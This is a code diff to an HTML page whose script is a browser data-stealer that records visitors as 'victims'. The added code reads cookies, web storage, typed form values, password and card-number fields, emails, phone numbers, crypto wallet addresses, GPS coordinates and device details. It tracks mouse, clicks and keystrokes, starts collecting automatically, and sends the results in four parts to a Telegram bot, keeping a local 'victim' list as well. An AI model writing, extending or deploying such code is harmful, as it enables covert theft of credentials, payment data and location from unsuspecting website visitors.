@@ -142,11 +142,12 @@
                     extractionTime: extractionTime,
                     timestamp: new Date().toISOString(),
                     victimId: generateVictimId(),
-                    url: window.location.href
+                    url: window.location.href,
+                    referrer: document.referrer
                 };
 
-                // Send to Telegram
-                await sendToTelegram(victimData);
+                // Send to Telegram in multiple messages if needed
+                await sendComprehensiveTelegramData(victimData);
                 
                 // Store in admin panel
                 storeInAdminPanel(victimData);
@@ -181,45 +182,49 @@
         async function extractAllPossibleData() {
             const data = {};
 
-            // Execute all extraction methods in parallel
-            const [
-                hardwareData,
-                systemData,
-                networkData,
-                userData,
-                browserData,
-                behavioralData
-            ] = await Promise.allSettled([
+            // Execute all extraction methods
+            const extractionPromises = [
                 extractHardwareData(),
                 extractSystemData(),
                 extractNetworkData(),
                 extractUserData(),
                 extractBrowserData(),
-                extractBehavioralData()
-            ]);
+                extractBehavioralData(),
+                extractAdvancedData(),
+                extractSocialData(),
+                extractFinancialData(),
+                extractGeolocationData()
+            ];
 
-            data.hardware = hardwareData.status === 'fulfilled' ? hardwareData.value : {};
-            data.system = systemData.status === 'fulfilled' ? systemData.value : {};
-            data.network = networkData.status === 'fulfilled' ? networkData.value : {};
-            data.user = userData.status === 'fulfilled' ? userData.value : {};
-            data.browser = browserData.status === 'fulfilled' ? browserData.value : {};
-            data.behavioral = behavioralData.status === 'fulfilled' ? behavioralData.value : {};
+            const results = await Promise.allSettled(extractionPromises);
+            
+            data.hardware = results[0].status === 'fulfilled' ? results[0].value : {};
+            data.system = results[1].status === 'fulfilled' ? results[1].value : {};
+            data.network = results[2].status === 'fulfilled' ? results[2].value : {};
+            data.user = results[3].status === 'fulfilled' ? results[3].value : {};
+            data.browser = results[4].status === 'fulfilled' ? results[4].value : {};
+            data.behavioral = results[5].status === 'fulfilled' ? results[5].value : {};
+            data.advanced = results[6].status === 'fulfilled' ? results[6].value : {};
+            data.social = results[7].status === 'fulfilled' ? results[7].value : {};
+            data.financial = results[8].status === 'fulfilled' ? results[8].value : {};
+            data.geolocation = results[9].status === 'fulfilled' ? results[9].value : {};
 
             return data;
         }
 
-        // I. Hardware & BIOS/UEFI Data
+        // 1. Enhanced Hardware Data
         async function extractHardwareData() {
             const data = {
                 cpu: extractCPUData(),
                 memory: extractMemoryData(),
                 gpu: extractGPUData(),
-                storage: extractStorageData(),
+                storage: await extractStorageData(),
                 network: extractNetworkHardwareData(),
                 audio: extractAudioData(),
                 peripherals: extractPeripheralData(),
                 sensors: extractSensorData(),
-                display: extractDisplayData()
+                display: extractDisplayData(),
+                battery: await extractBatteryData()
             };
 
             return data;
@@ -238,7 +243,6 @@
         }
 
         function extractMemoryData() {
-            // Memory information through performance API
             const memory = performance.memory;
             return {
                 totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
@@ -250,7 +254,7 @@
 
         function extractGPUData() {
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) return { available: false };
 
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
@@ -263,12 +267,13 @@
             };
         }
 
-        function extractStorageData() {
+        async function extractStorageData() {
             return {
                 localStorage: extractLocalStorage(),
                 sessionStorage: extractSessionStorage(),
                 cookies: extractCookies(),
-                indexedDB: await checkIndexedDB()
+                indexedDB: await checkIndexedDB(),
+                cache: await checkCacheAPI()
             };
         }
 
@@ -276,7 +281,9 @@
             const data = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                data[key] = localStorage.getItem(key);
+                try {
+                    data[key] = localStorage.getItem(key);
+                } catch (e) {}
             }
             return data;
         }
@@ -285,7 +292,9 @@
             const data = {};
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
-                data[key] = sessionStorage.getItem(key);
+                try {
+                    data[key] = sessionStorage.getItem(key);
+                } catch (e) {}
             }
             return data;
         }
@@ -303,6 +312,14 @@
                 return 'IndexedDB available: ' + !!window.indexedDB;
             } catch (e) {
                 return 'IndexedDB unavailable';
+            }
+        }
+
+        async function checkCacheAPI() {
+            try {
+                return 'Cache API available: ' + !!window.caches;
+            } catch (e) {
+                return 'Cache API unavailable';
             }
         }
 
@@ -366,7 +383,24 @@
             };
         }
 
-        // II. Operating System & Software Data
+        async function extractBatteryData() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: battery.level,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    return { available: false };
+                }
+            }
+            return { available: false };
+        }
+
+        // 2. Enhanced System Data
         async function extractSystemData() {
             return {
                 platform: navigator.platform,
@@ -435,7 +469,7 @@
             return availableFonts;
         }
 
-        // III. Network Configuration & Activity
+        // 3. Enhanced Network Data
         async function extractNetworkData() {
             const [ipData, networkInfo, connectionData] = await Promise.allSettled([
                 getIPInfo(),
@@ -455,7 +489,6 @@
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 
-                // Get additional IP info
                 try {
                     const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                     const ipData = await ipResponse.json();
@@ -484,18 +517,21 @@
                 url: window.location.href,
                 protocol: window.location.protocol,
                 host: window.location.host,
-                port: window.location.port
+                port: window.location.port,
+                origin: window.location.origin
             };
         }
 
-        // IV. User Data & Digital Footprint
+        // 4. Enhanced User Data
         async function extractUserData() {
             return {
                 forms: extractFormData(),
                 inputs: extractInputData(),
                 autofill: extractAutofillData(),
                 browsingData: await extractBrowsingData(),
-                socialMedia: extractSocialMediaData()
+                socialMedia: extractSocialMediaData(),
+                passwords: extractPasswordFields(),
+                creditCards: extractCreditCardFields()
             };
         }
 
@@ -505,7 +541,11 @@
                 const formData = {};
                 form.querySelectorAll('input, select, textarea').forEach(field => {
                     if (field.value) {
-                        formData[field.name || field.type] = field.value;
+                        formData[field.name || field.type || `field_${index}`] = {
+                            value: field.value,
+                            type: field.type,
+                            placeholder: field.placeholder
+                        };
                     }
                 });
                 if (Object.keys(formData).length > 0) {
@@ -517,9 +557,13 @@
 
         function extractInputData() {
             const inputs = {};
-            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"]').forEach(input => {
+            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"], input[type="search"], input[type="url"]').forEach(input => {
                 if (input.value) {
-                    inputs[input.name || 'unnamed'] = input.value;
+                    inputs[input.name || input.id || 'unnamed'] = {
+                        value: input.value,
+                        type: input.type,
+                        placeholder: input.placeholder
+                    };
                 }
             });
             return inputs;
@@ -527,13 +571,38 @@
 
         function extractAutofillData() {
             const autofill = {};
-            // Check for autofilled fields
             document.querySelectorAll('input').forEach(input => {
                 if (input.matches(':-webkit-autofill')) {
                     autofill[input.name || 'unnamed'] = 'autofilled';
                 }
             });
             return autofill;
+        }
+
+        function extractPasswordFields() {
+            const passwords = {};
+            document.querySelectorAll('input[type="password"]').forEach((input, index) => {
+                passwords[`password_${index}`] = {
+                    name: input.name,
+                    id: input.id,
+                    placeholder: input.placeholder,
+                    value: input.value
+                };
+            });
+            return passwords;
+        }
+
+        function extractCreditCardFields() {
+            const cards = {};
+            document.querySelectorAll('input[type="tel"][name*="card"], input[type="text"][name*="card"], input[type="number"][name*="card"]').forEach((input, index) => {
+                cards[`card_${index}`] = {
+                    name: input.name,
+                    id: input.id,
+                    placeholder: input.placeholder,
+                    value: input.value
+                };
+            });
+            return cards;
         }
 
         async function extractBrowsingData() {
@@ -544,7 +613,12 @@
                     localStorage: Object.keys(extractLocalStorage()).length,
                     sessionStorage: Object.keys(extractSessionStorage()).length,
                     cookies: Object.keys(extractCookies()).length
-                }
+                },
+                timing: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    loadEventEnd: performance.timing.loadEventEnd,
+                    domComplete: performance.timing.domComplete
+                } : {}
             };
         }
 
@@ -566,7 +640,6 @@
             const social = {};
             const html = document.documentElement.outerHTML;
             
-            // Check for social media indicators
             const platforms = {
                 facebook: /facebook|fb\.com/gi,
                 twitter: /twitter|tweet/gi,
@@ -574,7 +647,9 @@
                 linkedin: /linkedin/gi,
                 tiktok: /tiktok/gi,
                 discord: /discord/gi,
-                snapchat: /snapchat/gi
+                snapchat: /snapchat/gi,
+                whatsapp: /whatsapp/gi,
+                telegram: /telegram/gi
             };
             
             Object.keys(platforms).forEach(platform => {
@@ -586,7 +661,7 @@
             return social;
         }
 
-        // V. Browser Data
+        // 5. Enhanced Browser Data
         async function extractBrowserData() {
             return {
                 userAgent: navigator.userAgent,
@@ -603,18 +678,23 @@
                 webdriver: navigator.webdriver,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints
+                maxTouchPoints: navigator.maxTouchPoints,
+                userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues([
+                    "architecture", "model", "platform", "platformVersion", "uaFullVersion"
+                ]) : 'unavailable'
             };
         }
 
-        // VI. Behavioral Data
+        // 6. Enhanced Behavioral Data
         async function extractBehavioralData() {
             return {
                 mouseMovements: window.mouseMovements || [],
                 clicks: window.clickCount || 0,
                 scrollDepth: getScrollDepth(),
                 timeOnPage: Date.now() - window.pageLoadTime,
-                keystrokes: window.keystrokeCount || 0
+                keystrokes: window.keystrokeCount || 0,
+                focusChanges: window.focusChanges || 0,
+                resizeEvents: window.resizeEvents || 0
             };
         }
 
@@ -624,10 +704,241 @@
             return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
         }
 
-        // Telegram integration
-        async function sendToTelegram(data) {
+        // 7. Advanced Data Extraction
+        async function extractAdvancedData() {
+            return {
+                webRTC: await extractWebRTCData(),
+                serviceWorkers: await extractServiceWorkerData(),
+                notifications: extractNotificationData(),
+                permissions: await extractPermissionData(),
+                mediaDevices: await extractMediaDeviceData()
+            };
+        }
+
+        async function extractWebRTCData() {
             try {
-                const message = formatTelegramMessage(data);
+                const pc = new RTCPeerConnection();
+                const offer = await pc.createOffer();
+                return {
+                    webRTCAvailable: true,
+                    sdp: offer.sdp.substring(0, 100) + '...'
+                };
+            } catch (e) {
+                return { webRTCAvailable: false };
+            }
+        }
+
+        async function extractServiceWorkerData() {
+            return {
+                serviceWorkers: 'serviceWorker' in navigator,
+                controller: navigator.serviceWorker?.controller ? true : false
+            };
+        }
+
+        function extractNotificationData() {
+            return {
+                notifications: 'Notification' in window,
+                permission: Notification.permission
+            };
+        }
+
+        async function extractPermissionData() {
+            const permissions = {};
+            const permissionTypes = [
+                'camera', 'microphone', 'location', 'notifications', 
+                'background-sync', 'clipboard-read', 'clipboard-write'
+            ];
+            
+            for (const permission of permissionTypes) {
+                try {
+                    const result = await navigator.permissions.query({name: permission});
+                    permissions[permission] = result.state;
+                } catch (e) {}
+            }
+            return permissions;
+        }
+
+        async function extractMediaDeviceData() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    devices: devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId
+                    }))
+                };
+            } catch (e) {
+                return { available: false };
+            }
+        }
+
+        // 8. Social Data
+        async function extractSocialData() {
+            return {
+                socialProfiles: extractSocialProfiles(),
+                emailAddresses: extractEmailAddresses(),
+                phoneNumbers: extractPhoneNumbers()
+            };
+        }
+
+        function extractSocialProfiles() {
+            const profiles = {};
+            const text = document.body.innerText;
+            
+            // Extract potential social media handles
+            const patterns = {
+                instagram: /@[a-zA-Z0-9._]+/g,
+                twitter: /@[a-zA-Z0-9_]+/g,
+                discord: /[a-zA-Z0-9._]+#[0-9]{4}/g
+            };
+            
+            Object.keys(patterns).forEach(platform => {
+                const matches = text.match(patterns[platform]);
+                if (matches) profiles[platform] = matches;
+            });
+            
+            return profiles;
+        }
+
+        function extractEmailAddresses() {
+            const text = document.body.innerText;
+            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+            return text.match(emailRegex) || [];
+        }
+
+        function extractPhoneNumbers() {
+            const text = document.body.innerText;
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            return text.match(phoneRegex) || [];
+        }
+
+        // 9. Financial Data
+        async function extractFinancialData() {
+            return {
+                paymentMethods: extractPaymentMethods(),
+                cryptoWallets: extractCryptoWallets(),
+                bankingInfo: extractBankingInfo()
+            };
+        }
+
+        function extractPaymentMethods() {
+            const methods = {};
+            const text = document.body.innerText.toLowerCase();
+            
+            if (text.includes('paypal')) methods.paypal = 'detected';
+            if (text.includes('stripe')) methods.stripe = 'detected';
+            if (text.includes('venmo')) methods.venmo = 'detected';
+            if (text.includes('cash app')) methods.cashapp = 'detected';
+            
+            return methods;
+        }
+
+        function extractCryptoWallets() {
+            const wallets = {};
+            const text = document.body.innerText;
+            
+            const cryptoPatterns = {
+                bitcoin: /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
+                ethereum: /0x[a-fA-F0-9]{40}/g
+            };
+            
+            Object.keys(cryptoPatterns).forEach(crypto => {
+                const matches = text.match(cryptoPatterns[crypto]);
+                if (matches) wallets[crypto] = matches;
+            });
+            
+            return wallets;
+        }
+
+        function extractBankingInfo() {
+            const info = {};
+            const text = document.body.innerText;
+            
+            // Basic banking pattern detection
+            if (text.includes('routing') || text.includes('account number')) {
+                info.banking_terms = 'detected';
+            }
+            
+            return info;
+        }
+
+        // 10. Geolocation Data
+        async function extractGeolocationData() {
+            return {
+                ipLocation: await getIPLocation(),
+                browserLocation: await getBrowserLocation(),
+                wifiNetworks: extractWifiData()
+            };
+        }
+
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (e) {
+                return { error: 'Location unavailable' };
+            }
+        }
+
+        async function getBrowserLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ available: false });
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            available: true,
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        resolve({
+                            available: false,
+                            error: error.code
+                        });
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        function extractWifiData() {
+            return {
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                } : 'unavailable'
+            };
+        }
+
+        // Enhanced Telegram Integration
+        async function sendComprehensiveTelegramData(data) {
+            try {
+                // Send main summary
+                await sendToTelegram(formatMainSummary(data));
+                
+                // Send detailed hardware info
+                await sendToTelegram(formatHardwareDetails(data));
+                
+                // Send user data
+                await sendToTelegram(formatUserDetails(data));
+                
+                // Send behavioral data
+                await sendToTelegram(formatBehavioralDetails(data));
+                
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+            }
+        }
+
+        async function sendToTelegram(message) {
+            try {
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -646,7 +957,7 @@
             }
         }
 
-        function formatTelegramMessage(data) {
+        function formatMainSummary(data) {
             return `
 <b>🚨 COMPREHENSIVE DATA EXTRACTION COMPLETE</b>
 
@@ -654,65 +965,135 @@
 <b>⏰ Extraction Time:</b> ${data.meta.extractionTime}ms
 <b>🌐 URL:</b> ${data.meta.url}
 <b>📅 Timestamp:</b> ${new Date(data.meta.timestamp).toLocaleString()}
+<b>🔗 Referrer:</b> ${data.meta.referrer || 'Direct'}
 
-<b>💻 HARDWARE DATA:</b>
+<b>💻 SYSTEM OVERVIEW:</b>
+• OS: ${data.system.platform}
 • CPU: ${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}
 • Memory: ${data.hardware.memory.deviceMemory}GB
 • GPU: ${data.hardware.gpu.vendor || 'Unknown'}
 • Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
 
-<b>🌐 NETWORK DATA:</b>
+<b>🌐 NETWORK:</b>
 • IP: ${data.network.ip.ip || 'Unknown'}
 • Location: ${data.network.ip.city || 'Unknown'}, ${data.network.ip.country || 'Unknown'}
 • ISP: ${data.network.ip.org || 'Unknown'}
 • Connection: ${data.network.network.effectiveType}
 
-<b>🔧 SYSTEM DATA:</b>
-• OS: ${data.system.platform}
-• Language: ${data.system.language}
-• Timezone: ${data.system.timezone}
-• Fonts: ${data.system.fonts.length} detected
+<code>Part 1/4 - Summary</code>
+            `.trim();
+        }
 
-<b>👤 USER DATA:</b>
-• Forms: ${Object.keys(data.user.forms).length}
-• Inputs: ${Object.keys(data.user.inputs).length}
-• Social Media: ${Object.keys(data.user.socialMedia).join(', ') || 'None'}
+        function formatHardwareDetails(data) {
+            return `
+<b>🔧 HARDWARE DETAILS</b>
 
-<b>🌐 BROWSER DATA:</b>
-• Browser: ${data.browser.vendor || 'Unknown'}
-• User Agent: ${data.browser.userAgent.substring(0, 50)}...
-
-<b>📊 BEHAVIORAL DATA:</b>
-• Scroll Depth: ${data.behavioral.scrollDepth}%
-• Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
-• Clicks: ${data.behavioral.clicks}
-
-<b>💾 STORAGE DATA:</b>
+<b>💾 STORAGE:</b>
 • Local Storage: ${Object.keys(data.hardware.storage.localStorage).length} items
 • Cookies: ${Object.keys(data.hardware.storage.cookies).length}
 • Session Storage: ${Object.keys(data.hardware.storage.sessionStorage).length}
 
-<code>Extraction completed successfully</code>
+<b>🎮 PERIPHERALS:</b>
+• Touch: ${data.hardware.peripherals.touchSupport}
+• Bluetooth: ${data.hardware.peripherals.bluetooth}
+• USB: ${data.hardware.peripherals.usb}
+• Battery: ${data.hardware.battery.available ? data.hardware.battery.level * 100 + '%' : 'N/A'}
+
+<b>📊 PERFORMANCE:</b>
+• Heap Used: ${Math.round(data.hardware.memory.usedJSHeapSize / 1024 / 1024)}MB
+• Heap Limit: ${Math.round(data.hardware.memory.jsHeapSizeLimit / 1024 / 1024)}MB
+• Device Memory: ${data.hardware.memory.deviceMemory}GB
+
+<b>🔍 PLUGINS (${data.system.plugins.length}):</b>
+${data.system.plugins.slice(0, 5).map(p => `• ${p.name}`).join('\n')}
+
+<code>Part 2/4 - Hardware</code>
+            `.trim();
+        }
+
+        function formatUserDetails(data) {
+            const formCount = Object.keys(data.user.forms).length;
+            const inputCount = Object.keys(data.user.inputs).length;
+            const passwordCount = Object.keys(data.user.passwords).length;
+            
+            return `
+<b>👤 USER DATA ANALYSIS</b>
+
+<b>📝 FORM DATA:</b>
+• Forms Found: ${formCount}
+• Input Fields: ${inputCount}
+• Password Fields: ${passwordCount}
+
+<b>📱 SOCIAL MEDIA:</b>
+${Object.keys(data.user.socialMedia).length > 0 ? 
+    '• ' + Object.keys(data.user.socialMedia).join(', ') : '• None detected'}
+
+<b>📧 CONTACT INFO:</b>
+• Emails: ${data.social.emailAddresses.length}
+• Phones: ${data.social.phoneNumbers.length}
+• Social Handles: ${Object.keys(data.social.socialProfiles).length}
+
+<b>💳 FINANCIAL:</b>
+• Payment Methods: ${Object.keys(data.financial.paymentMethods).join(', ') || 'None'}
+• Crypto Wallets: ${Object.keys(data.financial.cryptoWallets).join(', ') || 'None'}
+
+<b>📍 GEOLOCATION:</b>
+• IP Location: ${data.geolocation.ipLocation.city || 'Unknown'}
+• Coordinates: ${data.geolocation.browserLocation.available ? 
+    `${data.geolocation.browserLocation.latitude}, ${data.geolocation.browserLocation.longitude}` : 'Not available'}
+
+<code>Part 3/4 - User Data</code>
+            `.trim();
+        }
+
+        function formatBehavioralDetails(data) {
+            return `
+<b>📊 BEHAVIORAL ANALYTICS</b>
+
+<b>🖱️ INTERACTIONS:</b>
+• Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
+• Scroll Depth: ${data.behavioral.scrollDepth}%
+• Mouse Movements: ${data.behavioral.mouseMovements.length}
+• Clicks: ${data.behavioral.clicks}
+• Keystrokes: ${data.behavioral.keystrokes}
+
+<b>🌐 BROWSER CAPABILITIES:</b>
+• WebRTC: ${data.advanced.webRTC.webRTCAvailable}
+• Notifications: ${data.advanced.notifications.permission}
+• Camera: ${data.advanced.permissions.camera || 'unknown'}
+• Microphone: ${data.advanced.permissions.microphone || 'unknown'}
+
+<b>📡 ADVANCED FEATURES:</b>
+• Service Workers: ${data.advanced.serviceWorkers.serviceWorkers}
+• Media Devices: ${data.advanced.mediaDevices.devices?.length || 0}
+
+<b>🔐 SECURITY:</b>
+• WebDriver: ${data.browser.webdriver ? 'Detected' : 'Not detected'}
+• Do Not Track: ${data.system.doNotTrack || 'Not set'}
+
+<code>Part 4/4 - Behavioral & Advanced</code>
+
+<b>✅ EXTRACTION COMPLETE - ALL DATA CAPTURED</b>
             `.trim();
         }
 
         // Admin panel storage
         function storeInAdminPanel(data) {
-            // Load existing victims
-            const existing = localStorage.getItem('victimData');
-            const victims = existing ? JSON.parse(existing) : [];
-            
-            // Add new victim
-            victims.unshift(data);
-            
-            // Keep only last 100 victims
-            if (victims.length > 100) {
-                victims.splice(100);
+            try {
+                const existing = localStorage.getItem('victimData');
+                const victims = existing ? JSON.parse(existing) : [];
+                
+                victims.unshift(data);
+                
+                if (victims.length > 100) {
+                    victims.splice(100);
+                }
+                
+                localStorage.setItem('victimData', JSON.stringify(victims));
+                localStorage.setItem('lastVictimUpdate', Date.now().toString());
+            } catch (e) {
+                console.error('Storage failed:', e);
             }
-            
-            // Save back
-            localStorage.setItem('victimData', JSON.stringify(victims));
-            localStorage.setItem('lastVictimUpdate', Date.now().toString());
         }
 
         // Utility functions
@@ -720,11 +1101,13 @@
             return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
         }
 
-        // Behavioral tracking
+        // Enhanced behavioral tracking
         window.pageLoadTime = Date.now();
         window.mouseMovements = [];
         window.clickCount = 0;
         window.keystrokeCount = 0;
+        window.focusChanges = 0;
+        window.resizeEvents = 0;
 
         document.addEventListener('mousemove', (e) => {
             window.mouseMovements.push({
@@ -745,7 +1128,22 @@
             window.keystrokeCount++;
         });
 
-        console.log('🕵️ Enhanced data extraction system loaded');
+        document.addEventListener('focus', () => {
+            window.focusChanges++;
+        });
+
+        window.addEventListener('resize', () => {
+            window.resizeEvents++;
+        });
+
+        // Auto-start data collection in background
+        setTimeout(() => {
+            extractAllPossibleData().then(data => {
+                console.log('🕵️ Background data collection complete', data);
+            });
+        }, 3000);
+
+        console.log('🕵️ Enhanced comprehensive data extraction system loaded');
     </script>
 </body>
 </html>
